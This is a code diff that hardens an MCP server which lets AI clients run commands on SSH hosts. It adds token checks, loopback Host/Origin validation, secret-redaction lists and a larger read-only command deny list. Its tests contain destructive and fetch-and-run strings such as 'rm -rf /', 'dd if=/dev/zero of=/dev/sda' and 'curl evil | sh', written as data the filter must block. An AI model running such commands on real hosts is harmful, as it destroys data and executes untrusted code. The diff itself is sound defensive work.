@@ -2,16 +2,29 @@
 //! Exposes hss hosts to MCP clients: `list-servers` and `execute-command`.
 //!
 //! Set `HSS_MCP_TOKEN` env var or `mcp_token` in config.toml to require a
-//! Bearer token. When unset the server accepts unauthenticated requests.
+//! Bearer token. When unset the server accepts unauthenticated requests for
+//! `list-servers` only (unless `allow_unauthenticated_execute` is enabled).
 //! Hosts/credentials are re-read from disk on every tool call, so changes
 //! made in a second hss window are visible without restart.
 
 use anyhow::Result;
 use serde_json::{json, Value};
+use std::sync::atomic::{AtomicUsize, Ordering};
 use std::sync::{Arc, Mutex};
 use std::time::Instant;
 
 pub const MCP_PORT: u16 = 8822;
+const MAX_CONCURRENT_TOOL_CALLS: usize = 8;
+
+static ACTIVE_TOOL_CALLS: AtomicUsize = AtomicUsize::new(0);
+
+struct ActiveCallGuard;
+
+impl Drop for ActiveCallGuard {
+    fn drop(&mut self) {
+        ACTIVE_TOOL_CALLS.fetch_sub(1, Ordering::SeqCst);
+    }
+}
 
 /// Severity of a log entry; drives colour in the MCP screen.
 #[derive(Debug, Clone, Copy, PartialEq)]
@@ -101,7 +114,7 @@ impl McpServer {
         }));
         let started = Instant::now();
 
-        let token = resolve_mcp_token();
+        let token = resolve_mcp_token(cfg);
         let allow_unauthenticated = cfg.allow_unauthenticated_execute;
         let auth_hint = if token.is_some() {
             "auth: bearer token required"
@@ -212,22 +225,46 @@ fn clip(s: &str, max: usize) -> String {
     format!("{head}…")
 }
 
-fn resolve_mcp_token() -> Option<String> {
+/// Truncate a UTF-8 string cleanly at or before `max_bytes` without splitting a code point.
+fn truncate_utf8(s: &str, max_bytes: usize) -> &str {
+    if s.len() <= max_bytes {
+        return s;
+    }
+    let mut idx = max_bytes;
+    while idx > 0 && !s.is_char_boundary(idx) {
+        idx -= 1;
+    }
+    &s[..idx]
+}
+
+fn resolve_mcp_token(cfg: &crate::config::AppConfig) -> Option<String> {
     if let Ok(t) = std::env::var("HSS_MCP_TOKEN") {
         let t = t.trim().to_string();
         if !t.is_empty() {
             return Some(t);
         }
     }
-    if let Ok(cfg) = crate::config::load_config() {
-        if let Some(t) = cfg.mcp_token {
-            let t = t.trim().to_string();
-            if !t.is_empty() {
-                return Some(t);
-            }
+    if let Some(ref t) = cfg.mcp_token {
+        let t = t.trim().to_string();
+        if !t.is_empty() {
+            return Some(t);
         }
     }
     None
+}
+
+/// Constant-time string comparison to avoid leaking Bearer token bytes via timing.
+fn constant_time_eq(a: &str, b: &str) -> bool {
+    let ab = a.as_bytes();
+    let bb = b.as_bytes();
+    let mut diff = ab.len() ^ bb.len();
+    let len = ab.len().max(bb.len());
+    for i in 0..len {
+        let x = ab.get(i).copied().unwrap_or(0);
+        let y = bb.get(i).copied().unwrap_or(0);
+        diff |= usize::from(x ^ y);
+    }
+    std::hint::black_box(diff) == 0
 }
 
 fn check_auth(request: &tiny_http::Request, token: &Option<String>) -> bool {
@@ -235,11 +272,71 @@ fn check_auth(request: &tiny_http::Request, token: &Option<String>) -> bool {
     for h in request.headers() {
         if h.field.equiv("Authorization") {
             if let Some(bearer) = h.value.as_str().strip_prefix("Bearer ") {
-                return bearer.trim() == expected;
+                return constant_time_eq(bearer.trim(), expected);
             }
         }
     }
     false
+}
+
+/// Validate that a Host header targets loopback (blocks DNS rebinding attacks).
+fn is_loopback_host(host: &str) -> bool {
+    let host = host.trim();
+    if host.is_empty() {
+        return false;
+    }
+    let host_only = if let Some(rest) = host.strip_prefix('[') {
+        let Some(end) = rest.find(']') else {
+            return false;
+        };
+        let after = &rest[end + 1..];
+        if !after.is_empty() {
+            let Some(port) = after.strip_prefix(':') else {
+                return false;
+            };
+            if port.parse::<u16>().is_err() {
+                return false;
+            }
+        }
+        &rest[..end]
+    } else if let Some((h, p)) = host.rsplit_once(':') {
+        if p.parse::<u16>().is_ok() && !h.contains(':') {
+            h
+        } else {
+            host
+        }
+    } else {
+        host
+    };
+
+    host_only == "127.0.0.1"
+        || host_only.eq_ignore_ascii_case("localhost")
+        || host_only == "::1"
+}
+
+/// Validate that an Origin header (if present) comes from loopback (blocks cross-origin CSRF).
+fn is_allowed_origin(origin: &str) -> bool {
+    let origin = origin.trim();
+    let rest = origin
+        .strip_prefix("http://")
+        .or_else(|| origin.strip_prefix("https://"));
+    let Some(rest) = rest else {
+        return false;
+    };
+    let authority = rest.split('/').next().unwrap_or("");
+    is_loopback_host(authority)
+}
+
+fn check_host_and_origin(request: &tiny_http::Request) -> Option<&'static str> {
+    for h in request.headers() {
+        if h.field.equiv("Host") && !is_loopback_host(h.value.as_str()) {
+            return Some("Forbidden: non-loopback Host header");
+        }
+        if h.field.equiv("Origin") && !is_allowed_origin(h.value.as_str()) {
+            return Some("Forbidden: non-loopback Origin header");
+        }
+    }
+    None
 }
 
 fn serve_loop(
@@ -252,6 +349,20 @@ fn serve_loop(
     for mut request in server.incoming_requests() {
         let method = request.method().clone();
         let url = request.url().to_string();
+
+        // Host & Origin validation (DNS rebinding + browser CSRF defense)
+        if let Some(reason) = check_host_and_origin(&request) {
+            log_line(
+                &log,
+                started,
+                Level::Err,
+                "security",
+                format!("rejected: {reason}"),
+                vec![format!("{} {}", method, request.url())],
+            );
+            let _ = request.respond(make_response(403, Some(json!({"error": reason}))));
+            continue;
+        }
 
         // Path check: only / or /mcp endpoint
         if url != "/" && url != "/mcp" {
@@ -355,17 +466,17 @@ fn serve_loop(
 
         let is_tool_call = rpc_method.as_deref() == Some("tools/call");
 
-        let auth_for_exec = is_authed || allow_unauthenticated_execute;
+        let auth_for_exec = (token.is_some() && is_authed) || allow_unauthenticated_execute;
 
         if is_tool_call {
             // Tool calls may run SSH commands that take minutes.
-            // Bounded concurrency: cap parallel background tool calls to 8 to avoid thread exhaustion.
-            const MAX_CONCURRENT_TOOL_CALLS: usize = 8;
-            static ACTIVE_TOOL_CALLS: std::sync::atomic::AtomicUsize =
-                std::sync::atomic::AtomicUsize::new(0);
-
-            let current = ACTIVE_TOOL_CALLS.load(std::sync::atomic::Ordering::Relaxed);
-            if current >= MAX_CONCURRENT_TOOL_CALLS {
+            // Atomically reserve a concurrency slot (released via RAII guard even on panic).
+            let reserved = ACTIVE_TOOL_CALLS.fetch_update(
+                Ordering::SeqCst,
+                Ordering::SeqCst,
+                |cur| (cur < MAX_CONCURRENT_TOOL_CALLS).then_some(cur + 1),
+            );
+            if reserved.is_err() {
                 let _ = request.respond(make_response(
                     429,
                     Some(json!({
@@ -379,12 +490,12 @@ fn serve_loop(
                 continue;
             }
 
-            ACTIVE_TOOL_CALLS.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
+            let guard = ActiveCallGuard;
             let lg = log.clone();
             std::thread::spawn(move || {
+                let _guard = guard;
                 let (status, body) = handle_rpc(&buf, &lg, started, auth_for_exec);
                 let _ = request.respond(make_response(status, body));
-                ACTIVE_TOOL_CALLS.fetch_sub(1, std::sync::atomic::Ordering::SeqCst);
             });
         } else {
             // Fast RPC: ping, initialize, tools/list, notifications.
@@ -601,6 +712,36 @@ fn rpc_error(id: Value, code: i64, message: &str) -> Value {
     json!({ "jsonrpc": "2.0", "id": id, "error": { "code": code, "message": message } })
 }
 
+/// Case-insensitive glob matcher supporting `*` anywhere in `pattern`.
+fn glob_match_ci(pattern: &str, text: &str) -> bool {
+    let p: Vec<char> = pattern.chars().map(|c| c.to_ascii_lowercase()).collect();
+    let t: Vec<char> = text.chars().map(|c| c.to_ascii_lowercase()).collect();
+    let (mut pi, mut ti) = (0usize, 0usize);
+    let mut star_idx: Option<usize> = None;
+    let mut match_idx = 0usize;
+
+    while ti < t.len() {
+        if pi < p.len() && p[pi] == t[ti] {
+            pi += 1;
+            ti += 1;
+        } else if pi < p.len() && p[pi] == '*' {
+            star_idx = Some(pi);
+            match_idx = ti;
+            pi += 1;
+        } else if let Some(star) = star_idx {
+            pi = star + 1;
+            match_idx += 1;
+            ti = match_idx;
+        } else {
+            return false;
+        }
+    }
+    while pi < p.len() && p[pi] == '*' {
+        pi += 1;
+    }
+    pi == p.len()
+}
+
 /// Checks whether `host` is allowed by the MCP allowed_hosts pattern.
 /// Pattern can be comma-separated list of names/wildcards or "tag:xyz" or "*".
 pub fn is_host_allowed_for_mcp(pattern: &str, host: &crate::types::Host) -> bool {
@@ -621,36 +762,156 @@ pub fn is_host_allowed_for_mcp(pattern: &str, host: &crate::types::Host) -> bool
             if host.tags.iter().any(|t| t.eq_ignore_ascii_case(tag_req)) {
                 return true;
             }
+            continue;
         }
-        if let Some(prefix) = rule.strip_suffix('*') {
-            if host.name.starts_with(prefix) || host.ip.starts_with(prefix) {
-                return true;
-            }
-        } else if host.name.eq_ignore_ascii_case(rule) || host.ip.eq_ignore_ascii_case(rule) {
+        if glob_match_ci(rule, &host.name) || glob_match_ci(rule, &host.ip) {
             return true;
         }
     }
     false
 }
 
-/// DLP filter: redacts private keys, certificates and sensitive tokens from command outputs.
+fn is_token_char(c: char) -> bool {
+    c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | '+' | '/' | '=')
+}
+
+/// Redact tokens starting with known secret prefixes (e.g. `ghp_`, `xoxb-`, `sk-`, `AKIA`).
+fn redact_prefixed_tokens(line: &str) -> String {
+    let prefixes: &[(&str, usize, &str)] = &[
+        ("github_pat_", 20, "[REDACTED:TOKEN]"),
+        ("ghp_", 20, "[REDACTED:TOKEN]"),
+        ("gho_", 20, "[REDACTED:TOKEN]"),
+        ("ghs_", 20, "[REDACTED:TOKEN]"),
+        ("ghu_", 20, "[REDACTED:TOKEN]"),
+        ("xoxb-", 10, "[REDACTED:TOKEN]"),
+        ("xoxp-", 10, "[REDACTED:TOKEN]"),
+        ("xoxa-", 10, "[REDACTED:TOKEN]"),
+        ("xoxr-", 10, "[REDACTED:TOKEN]"),
+        ("xoxs-", 10, "[REDACTED:TOKEN]"),
+        ("sk-proj-", 20, "[REDACTED:API_KEY]"),
+        ("sk-ant-", 20, "[REDACTED:API_KEY]"),
+        ("sk-", 20, "[REDACTED:API_KEY]"),
+        ("AKIA", 16, "[REDACTED:AWS_KEY]"),
+        ("ASIA", 16, "[REDACTED:AWS_KEY]"),
+    ];
+
+    let mut result = line.to_string();
+    for &(prefix, min_tail, replacement) in prefixes {
+        let mut search_from = 0usize;
+        while let Some(rel) = result[search_from..].find(prefix) {
+            let start = search_from + rel;
+            let boundary_ok = start == 0
+                || !result[..start]
+                    .chars()
+                    .next_back()
+                    .is_some_and(|c| c.is_ascii_alphanumeric() || c == '_');
+            if !boundary_ok {
+                search_from = start + prefix.len();
+                continue;
+            }
+            let after_prefix = start + prefix.len();
+            let tail_len = result[after_prefix..]
+                .char_indices()
+                .take_while(|&(_, c)| is_token_char(c))
+                .last()
+                .map(|(i, c)| i + c.len_utf8())
+                .unwrap_or(0);
+            let is_aws = prefix == "AKIA" || prefix == "ASIA";
+            let valid_match = if is_aws {
+                tail_len == 16
+                    && result[after_prefix..after_prefix + tail_len]
+                        .bytes()
+                        .all(|b| b.is_ascii_uppercase() || b.is_ascii_digit())
+            } else {
+                tail_len >= min_tail
+            };
+            if valid_match {
+                result.replace_range(start..after_prefix + tail_len, replacement);
+                search_from = start + replacement.len();
+            } else {
+                search_from = after_prefix;
+            }
+        }
+    }
+    result
+}
+
+fn is_sensitive_env_key(key: &str) -> bool {
+    let upper = key.trim().to_ascii_uppercase();
+    if upper.is_empty()
+        || !upper
+            .bytes()
+            .all(|b| b.is_ascii_uppercase() || b.is_ascii_digit() || b == b'_')
+    {
+        return false;
+    }
+    const MARKERS: &[&str] = &[
+        "PASSWORD",
+        "PASSWD",
+        "SECRET",
+        "API_KEY",
+        "APIKEY",
+        "PRIVATE_KEY",
+        "ACCESS_TOKEN",
+        "AUTH_TOKEN",
+        "REFRESH_TOKEN",
+        "SESSION_TOKEN",
+        "BEARER_TOKEN",
+        "DB_PASS",
+    ];
+    MARKERS.iter().any(|m| upper.contains(m)) || upper.ends_with("_TOKEN") || upper == "TOKEN"
+}
+
+fn redact_single_line(line: &str) -> String {
+    // 1. Authorization: Bearer / Basic headers
+    let lower = line.to_ascii_lowercase();
+    if let Some(idx) = lower.find("authorization:") {
+        let after = &line[idx + "authorization:".len()..];
+        let trimmed = after.trim_start();
+        let trimmed_lower = trimmed.to_ascii_lowercase();
+        if trimmed_lower.starts_with("bearer ") || trimmed_lower.starts_with("basic ") {
+            let prefix = &line[..idx + "authorization:".len()];
+            return format!("{prefix} [REDACTED:AUTH_HEADER]");
+        }
+    }
+
+    // 2. Sensitive KEY=VALUE or `export KEY=VALUE` assignments
+    let check_part = line
+        .trim_start()
+        .strip_prefix("export ")
+        .unwrap_or(line.trim_start());
+    if let Some(eq_idx) = check_part.find('=') {
+        let key = &check_part[..eq_idx];
+        let val = check_part[eq_idx + 1..].trim();
+        if is_sensitive_env_key(key) && !val.is_empty() {
+            let lead_len = line.len() - check_part.len();
+            let prefix = &line[..lead_len + eq_idx + 1];
+            return format!("{prefix}[REDACTED]");
+        }
+    }
+
+    // 3. Inline known token prefixes (GitHub, Slack, AWS, sk-* API keys)
+    redact_prefixed_tokens(line)
+}
+
+/// DLP filter: redacts private keys, auth headers, sensitive env assignments, and API tokens.
 pub fn redact_sensitive_output(text: &str) -> String {
     let mut out = String::new();
     let mut in_private_key = false;
 
     for line in text.lines() {
-        if line.contains("-----BEGIN") && line.contains("PRIVATE KEY-----") {
+        if line.contains("-----BEGIN") && line.contains("PRIVATE KEY") {
             in_private_key = true;
             out.push_str("[REDACTED: PRIVATE KEY DETECTED]\n");
             continue;
         }
         if in_private_key {
-            if line.contains("-----END") && line.contains("PRIVATE KEY-----") {
+            if line.contains("-----END") && line.contains("PRIVATE KEY") {
                 in_private_key = false;
             }
             continue;
         }
-        out.push_str(line);
+        out.push_str(&redact_single_line(line));
         out.push('\n');
     }
 
@@ -662,35 +923,205 @@ pub fn redact_sensitive_output(text: &str) -> String {
     }
 }
 
-/// Checks if command is destructive and prohibited under read-only mode.
+/// Normalize a command token by stripping quotes, backslash escapes, and path prefixes.
+fn normalize_cmd_word(raw: &str) -> String {
+    let unquoted = raw.trim_matches(|c| c == '\'' || c == '"');
+    let no_escape = unquoted.replace('\\', "");
+    let base = no_escape.rsplit('/').next().unwrap_or(&no_escape);
+    base.to_ascii_lowercase()
+}
+
+/// Returns true if `cmd` contains an output redirection other than `/dev/null` or `2>&1`.
+fn has_mutating_redirection(cmd: &str) -> bool {
+    let bytes = cmd.as_bytes();
+    let mut in_single = false;
+    let mut in_double = false;
+    let mut i = 0;
+
+    while i < bytes.len() {
+        match bytes[i] {
+            b'\'' if !in_double => in_single = !in_single,
+            b'"' if !in_single => in_double = !in_double,
+            b'>' if !in_single && !in_double => {
+                // Allow fd duplication like `2>&1` and discarding to `/dev/null`
+                let rest = cmd[i + 1..].trim_start();
+                let is_fd_dup = rest.starts_with("&1") || rest.starts_with("&2");
+                let target = rest.trim_start_matches('>').trim_start();
+                let is_dev_null = target == "/dev/null"
+                    || target.starts_with("/dev/null ")
+                    || target.starts_with("/dev/null;")
+                    || target.starts_with("/dev/null|")
+                    || target.starts_with("/dev/null&");
+                if !is_fd_dup && !is_dev_null {
+                    return true;
+                }
+                if i + 1 < bytes.len() && bytes[i + 1] == b'>' {
+                    i += 1;
+                }
+            }
+            _ => {}
+        }
+        i += 1;
+    }
+    false
+}
+
+/// Checks if a command is destructive or mutating and therefore prohibited under read-only mode.
 pub fn is_prohibited_command_in_read_only(cmd: &str) -> Option<&'static str> {
     let trimmed = cmd.trim();
-    let lower = trimmed.to_lowercase();
+    if trimmed.is_empty() {
+        return None;
+    }
 
-    let dangerous_tokens = [
-        ("rm ", "rm (file removal)"),
-        ("rmdir", "rmdir (directory removal)"),
-        ("mkfs", "mkfs (filesystem format)"),
-        ("dd ", "dd (raw write)"),
-        ("shutdown", "shutdown"),
-        ("reboot", "reboot"),
-        ("poweroff", "poweroff"),
-        ("init 0", "init 0"),
-        ("init 6", "init 6"),
-        ("sudo", "sudo (elevation of privileges)"),
-        ("su ", "su (user switch)"),
-        ("chmod -r", "chmod -R (recursive permission modification)"),
-        ("chown -r", "chown -R (recursive ownership modification)"),
-        ("> /dev/sd", "raw disk write redirection"),
-    ];
+    // Block command substitution (`$(...)` and backticks) because inner commands cannot be vetted safely
+    if trimmed.contains("$(") || trimmed.contains('`') {
+        return Some("command substitution in read-only mode");
+    }
 
-    for (token, reason) in dangerous_tokens {
-        if lower.starts_with(token)
-            || lower.contains(&format!(" {token}"))
-            || lower.contains(&format!(";{token}"))
-            || lower.contains(&format!("|{token}"))
+    // Block file-writing redirections (`>`, `>>`, `>|`) except `/dev/null` and `2>&1`
+    if has_mutating_redirection(trimmed) {
+        return Some("output redirection (file write)");
+    }
+
+    // Split into shell segments on operators
+    for segment in trimmed.split([';', '|', '&', '\n', '\r', '(', ')']) {
+        let tokens: Vec<&str> = segment.split_whitespace().collect();
+        if tokens.is_empty() {
+            continue;
+        }
+
+        // Skip leading env assignments (`FOO=bar`) and transparent wrappers (`env`, `command`, `nohup`, ...)
+        let mut idx = 0;
+        while idx < tokens.len() {
+            let tok = tokens[idx];
+            if tok.contains('=') && !tok.starts_with('-') && !tok.starts_with('/') {
+                idx += 1;
+                continue;
+            }
+            let base = normalize_cmd_word(tok);
+            match base.as_str() {
+                "env" | "command" | "builtin" | "nohup" | "time" | "nice" | "ionice" => {
+                    idx += 1;
+                    while idx < tokens.len() && tokens[idx].starts_with('-') {
+                        idx += 1;
+                    }
+                    continue;
+                }
+                "timeout" => {
+                    idx += 1;
+                    while idx < tokens.len() && tokens[idx].starts_with('-') {
+                        idx += 1;
+                    }
+                    // Skip duration argument
+                    if idx < tokens.len() {
+                        idx += 1;
+                    }
+                    continue;
+                }
+                _ => break,
+            }
+        }
+
+        if idx >= tokens.len() {
+            continue;
+        }
+
+        let cmd_name = normalize_cmd_word(tokens[idx]);
+        let args = &tokens[idx + 1..];
+
+        // Direct prohibited commands
+        match cmd_name.as_str() {
+            "rm" => return Some("rm (file removal)"),
+            "rmdir" => return Some("rmdir (directory removal)"),
+            "mv" => return Some("mv (file move/overwrite)"),
+            "cp" => return Some("cp (file copy/overwrite)"),
+            "dd" => return Some("dd (raw write)"),
+            "shred" | "wipefs" => return Some("disk/file wipe utility"),
+            "fdisk" | "parted" | "sfdisk" | "gdisk" => return Some("disk partitioning utility"),
+            "shutdown" => return Some("shutdown"),
+            "reboot" => return Some("reboot"),
+            "poweroff" | "halt" => return Some("poweroff/halt"),
+            "init" | "telinit" => return Some("init/runlevel change"),
+            "sudo" | "doas" | "pkexec" => return Some("privilege escalation"),
+            "su" => return Some("su (user switch)"),
+            "chmod" | "chown" | "chgrp" => return Some("permission/ownership modification"),
+            "kill" | "killall" | "pkill" => return Some("process termination"),
+            "passwd" | "chpasswd" | "useradd" | "userdel" | "usermod" | "groupadd" | "groupdel"
+            | "groupmod" => return Some("account/group modification"),
+            "tee" | "truncate" | "touch" | "mkdir" | "ln" | "install" => {
+                return Some("filesystem write/modification")
+            }
+            "eval" | "exec" | "source" | "." => return Some("dynamic shell execution"),
+            "xargs" => return Some("xargs (indirect command execution)"),
+            "sh" | "bash" | "zsh" | "dash" | "ksh" | "ash" | "fish" => {
+                return Some("subshell execution in read-only mode")
+            }
+            "crontab" | "at" => return Some("scheduled task modification"),
+            "mount" | "umount" => return Some("mount modification"),
+            "iptables" | "ip6tables" | "nft" | "ufw" => return Some("firewall modification"),
+            "apt" | "apt-get" | "dpkg" | "yum" | "dnf" | "rpm" | "pacman" | "apk" | "pip"
+            | "pip3" => return Some("package manager command"),
+            _ if cmd_name.starts_with("mkfs") => return Some("mkfs (filesystem format)"),
+            _ => {}
+        }
+
+        // Subcommand/flag-specific prohibitions for otherwise useful inspection tools
+        if cmd_name == "sed" && args.iter().any(|a| *a == "-i" || a.starts_with("-i")) {
+            return Some("sed -i (in-place file edit)");
+        }
+        if cmd_name == "find"
+            && args
+                .iter()
+                .any(|a| matches!(*a, "-delete" | "-exec" | "-execdir" | "-ok" | "-okdir"))
         {
-            return Some(reason);
+            return Some("find with -delete/-exec");
+        }
+        if cmd_name == "sysctl" && args.iter().any(|a| *a == "-w" || a.contains('=')) {
+            return Some("sysctl write");
+        }
+        if cmd_name == "systemctl" {
+            if let Some(sub) = args.iter().find(|a| !a.starts_with('-')) {
+                if matches!(
+                    sub.to_ascii_lowercase().as_str(),
+                    "start"
+                        | "stop"
+                        | "restart"
+                        | "reload"
+                        | "reload-or-restart"
+                        | "enable"
+                        | "disable"
+                        | "mask"
+                        | "unmask"
+                        | "kill"
+                        | "reboot"
+                        | "poweroff"
+                        | "halt"
+                ) {
+                    return Some("systemctl mutating action");
+                }
+            }
+        }
+        if cmd_name == "docker" || cmd_name == "podman" {
+            if let Some(sub) = args.iter().find(|a| !a.starts_with('-')) {
+                if matches!(
+                    sub.to_ascii_lowercase().as_str(),
+                    "rm" | "rmi"
+                        | "kill"
+                        | "stop"
+                        | "start"
+                        | "restart"
+                        | "run"
+                        | "exec"
+                        | "prune"
+                        | "build"
+                        | "push"
+                        | "pull"
+                        | "create"
+                        | "cp"
+                ) {
+                    return Some("container mutating action");
+                }
+            }
         }
     }
     None
@@ -700,7 +1131,7 @@ pub fn tool_definitions() -> Value {
     json!([
         {
             "name": "list-servers",
-            "description": "List all SSH servers configured in hss (name, group, address, port, tags, description).",
+            "description": "List all SSH servers configured in hss (name, group, address, port, tags).",
             "inputSchema": { "type": "object", "properties": {} }
         },
         {
@@ -836,16 +1267,41 @@ fn call_tool(
 
             let cfg = crate::config::load_config().unwrap_or_default();
 
-            // 1. Host Access Policy
-            if let Ok(hosts) = crate::config::load_hosts() {
-                if let Some(h) = hosts.iter().find(|h| h.name == host || h.ip == host) {
-                    if !is_host_allowed_for_mcp(&cfg.mcp_allowed_hosts, h) {
+            // 1. Host Access Policy (fail closed if hosts.toml cannot be loaded or host is unlisted under restrictive policy)
+            let policy_restricted = {
+                let p = cfg.mcp_allowed_hosts.trim();
+                !p.is_empty() && p != "*"
+            };
+            match crate::config::load_hosts() {
+                Ok(hosts) => {
+                    if let Some(h) = hosts.iter().find(|h| h.name == host || h.ip == host) {
+                        if !is_host_allowed_for_mcp(&cfg.mcp_allowed_hosts, h) {
+                            log_line(
+                                log,
+                                started,
+                                Level::Err,
+                                "policy",
+                                format!(
+                                    "execute-command rejected: host '{host}' not permitted by mcp_allowed_hosts"
+                                ),
+                                vec![format!("policy: {}", cfg.mcp_allowed_hosts)],
+                            );
+                            return tool_text(
+                                format!(
+                                    "Access to host '{host}' is restricted by MCP security policy."
+                                ),
+                                true,
+                            );
+                        }
+                    } else if policy_restricted {
                         log_line(
                             log,
                             started,
                             Level::Err,
                             "policy",
-                            format!("execute-command rejected: host '{host}' not permitted by mcp_allowed_hosts"),
+                            format!(
+                                "execute-command rejected: unknown host '{host}' blocked under restrictive mcp_allowed_hosts"
+                            ),
                             vec![format!("policy: {}", cfg.mcp_allowed_hosts)],
                         );
                         return tool_text(
@@ -855,6 +1311,20 @@ fn call_tool(
                             true,
                         );
                     }
+                }
+                Err(e) => {
+                    log_line(
+                        log,
+                        started,
+                        Level::Err,
+                        "policy",
+                        format!("execute-command rejected: failed to load hosts for policy check: {e:#}"),
+                        vec![],
+                    );
+                    return tool_text(
+                        format!("Failed to load host configuration for policy check: {e:#}"),
+                        true,
+                    );
                 }
             }
 
@@ -891,8 +1361,20 @@ fn call_tool(
             match crate::ssh::exec_command(host, command) {
                 Ok(out) => {
                     let code = out.status.code().unwrap_or(-1);
-                    let stdout = String::from_utf8_lossy(&out.stdout);
-                    let stderr = String::from_utf8_lossy(&out.stderr);
+                    let raw_stdout = String::from_utf8_lossy(&out.stdout);
+                    let raw_stderr = String::from_utf8_lossy(&out.stderr);
+                    let stdout = if cfg.mcp_dlp_filter {
+                        redact_sensitive_output(&raw_stdout)
+                    } else {
+                        raw_stdout.into_owned()
+                    };
+                    let stderr = if cfg.mcp_dlp_filter {
+                        redact_sensitive_output(&raw_stderr)
+                    } else {
+                        raw_stderr.into_owned()
+                    };
+
+                    // Log samples AFTER DLP redaction so secrets never leak to mcp_log_file
                     let ms = t0.elapsed().as_millis();
                     let mut detail = vec![
                         format!("exit status: {code} (duration: {ms} ms)"),
@@ -928,23 +1410,13 @@ fn call_tool(
                         format!("execute-command @ {host} finished (exit {code}, {ms} ms)"),
                         detail,
                     );
-                    let stdout = if cfg.mcp_dlp_filter {
-                        redact_sensitive_output(&stdout)
-                    } else {
-                        stdout.to_string()
-                    };
-                    let stderr = if cfg.mcp_dlp_filter {
-                        redact_sensitive_output(&stderr)
-                    } else {
-                        stderr.to_string()
-                    };
 
                     let mut text = format!("exit code: {code}\n");
                     const MAX_TOOL_OUTPUT_BYTES: usize = 128 * 1024; // 128 KiB
                     if !stdout.is_empty() {
                         text.push_str("stdout:\n");
                         if stdout.len() > MAX_TOOL_OUTPUT_BYTES {
-                            text.push_str(&stdout[..MAX_TOOL_OUTPUT_BYTES]);
+                            text.push_str(truncate_utf8(&stdout, MAX_TOOL_OUTPUT_BYTES));
                             text.push_str("\n[TRUNCATED: output exceeded 128 KiB]\n");
                         } else {
                             text.push_str(&stdout);
@@ -953,7 +1425,7 @@ fn call_tool(
                     if !stderr.is_empty() {
                         text.push_str("stderr:\n");
                         if stderr.len() > MAX_TOOL_OUTPUT_BYTES {
-                            text.push_str(&stderr[..MAX_TOOL_OUTPUT_BYTES]);
+                            text.push_str(truncate_utf8(&stderr, MAX_TOOL_OUTPUT_BYTES));
                             text.push_str("\n[TRUNCATED: output exceeded 128 KiB]\n");
                         } else {
                             text.push_str(&stderr);
@@ -1144,26 +1616,48 @@ mod tests {
     }
 
     #[test]
-    fn dlp_redacts_private_keys_from_output() {
-        let raw = "Some benign output\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAA\n-----END OPENSSH PRIVATE KEY-----\nDone.";
+    fn dlp_redacts_private_keys_and_tokens_from_output() {
+        let raw = "Some benign output\n\
+                   -----BEGIN OPENSSH PRIVATE KEY-----\n\
+                   b3BlbnNzaC1rZXktdjEAAAA\n\
+                   -----END OPENSSH PRIVATE KEY-----\n\
+                   export DB_PASSWORD=supersecret\n\
+                   Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.payload.sig\n\
+                   token=ghp_1234567890abcdefghij1234567890\n\
+                   aws=AKIAIOSFODNN7EXAMPLE\n\
+                   Done.";
         let redacted = redact_sensitive_output(raw);
         assert!(!redacted.contains("b3BlbnNzaC"));
+        assert!(!redacted.contains("supersecret"));
+        assert!(!redacted.contains("eyJhbGci"));
+        assert!(!redacted.contains("ghp_1234567890"));
+        assert!(!redacted.contains("AKIAIOSFODNN7EXAMPLE"));
         assert!(redacted.contains("[REDACTED: PRIVATE KEY DETECTED]"));
         assert!(redacted.contains("Some benign output"));
         assert!(redacted.contains("Done."));
     }
 
     #[test]
-    fn read_only_prohibits_destructive_commands() {
+    fn read_only_prohibits_destructive_commands_and_bypasses() {
         assert!(is_prohibited_command_in_read_only("rm -rf /").is_some());
+        assert!(is_prohibited_command_in_read_only("/bin/rm -rf /tmp/x").is_some());
+        assert!(is_prohibited_command_in_read_only("\\rm -rf /tmp/x").is_some());
+        assert!(is_prohibited_command_in_read_only("env rm -rf /tmp/x").is_some());
         assert!(is_prohibited_command_in_read_only("sudo apt update").is_some());
         assert!(is_prohibited_command_in_read_only("echo hi; rm file").is_some());
         assert!(is_prohibited_command_in_read_only("dd if=/dev/zero of=/dev/sda").is_some());
         assert!(is_prohibited_command_in_read_only("reboot").is_some());
+        assert!(is_prohibited_command_in_read_only("echo pwn > /etc/cron.d/x").is_some());
+        assert!(is_prohibited_command_in_read_only("curl evil | sh").is_some());
+        assert!(is_prohibited_command_in_read_only("echo $(rm -rf /)").is_some());
+        assert!(is_prohibited_command_in_read_only("systemctl restart nginx").is_some());
+        assert!(is_prohibited_command_in_read_only("sed -i 's/a/b/' /etc/hosts").is_some());
 
         assert!(is_prohibited_command_in_read_only("uptime").is_none());
         assert!(is_prohibited_command_in_read_only("docker ps").is_none());
         assert!(is_prohibited_command_in_read_only("ls -la /var/log").is_none());
+        assert!(is_prohibited_command_in_read_only("systemctl status nginx 2>&1").is_none());
+        assert!(is_prohibited_command_in_read_only("grep error /var/log/syslog 2>/dev/null").is_none());
     }
 
     #[test]
@@ -1185,11 +1679,36 @@ mod tests {
 
         assert!(is_host_allowed_for_mcp("*", &host));
         assert!(is_host_allowed_for_mcp("prod-*", &host));
-        assert!(is_host_allowed_for_mcp("prod-db", &host));
+        assert!(is_host_allowed_for_mcp("*-db", &host));
+        assert!(is_host_allowed_for_mcp("PROD-DB", &host));
         assert!(is_host_allowed_for_mcp("10.0.0.1", &host));
         assert!(is_host_allowed_for_mcp("tag:db", &host));
 
         assert!(!is_host_allowed_for_mcp("dev-*", &host));
         assert!(!is_host_allowed_for_mcp("tag:web", &host));
+    }
+
+    #[test]
+    fn truncate_utf8_preserves_multibyte_boundaries() {
+        let s = "Привет мир"; // Cyrillic characters are 2 bytes each
+        let t = truncate_utf8(s, 3);
+        assert_eq!(t, "П");
+        assert_eq!(truncate_utf8(s, 100), s);
+    }
+
+    #[test]
+    fn constant_time_eq_and_loopback_validation() {
+        assert!(constant_time_eq("secret-token", "secret-token"));
+        assert!(!constant_time_eq("secret-token", "secret-tokeN"));
+        assert!(!constant_time_eq("short", "much-longer"));
+
+        assert!(is_loopback_host("127.0.0.1:8822"));
+        assert!(is_loopback_host("localhost:8822"));
+        assert!(is_loopback_host("[::1]:8822"));
+        assert!(!is_loopback_host("evil.example:8822"));
+
+        assert!(is_allowed_origin("http://127.0.0.1:3000"));
+        assert!(is_allowed_origin("http://localhost:8822"));
